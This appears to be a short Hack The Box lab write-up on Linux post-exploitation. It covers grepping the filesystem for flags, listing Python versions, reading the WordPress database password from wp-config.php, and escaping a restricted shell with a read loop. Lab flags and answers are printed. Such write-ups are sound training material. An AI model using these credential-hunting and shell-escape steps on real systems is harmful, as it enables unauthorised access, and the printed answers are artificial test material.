
> [!NOTE] Environment Enumeration
> Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer.

We used **Regex** to find the flag through a keyword search.
```bash
$ find / -type f -name "*.sh" -exec grep -H "HTB" {} \; 2>/dev/null
```

*Output:*
```bash
find / -type f -name "*.sh" -exec grep -H "HTB" {} \; 2>/dev/null/usr/lib/int-check.sh:HTB{1nt3rn4l_5cr1p7_l34k}
```

> [!NOTE] Linux Services & Internals Enumeration
> What is the latest Python version that is installed on the target?

We use `python3 --version` to get the current version of python variable set on a system. But the question is asking the latest version of python apart from all versions of python.
```bash
ls /usr/bin/python*
```

*Output:*
```bash
/usr/bin/python3  /usr/bin/python3.11  /usr/bin/python3.8
```

> [!NOTE] Credential Hunting
> Find the WordPress database password.

Search for passwords in `wp-config.php` file.
```bash
cat /var/www/html/wp-config.php
```

*Output:*
```bash
---SNIP---
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'W0rdpr3ss_sekur1ty!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
---SNIP---
```



> [!NOTE] Escaping Restricted Shells
> Use different approaches to escape the restricted shell and read the flag.txt file. Submit the contents as the answer.

**Using `echo` to print the content of the file.**
```bash
while IFS= read -r line; do
>   echo "$line"
> done < flag.txt
```

*Output:*
```bash
HTB{35c4p3_7h3_r3stricted_5h311}
```
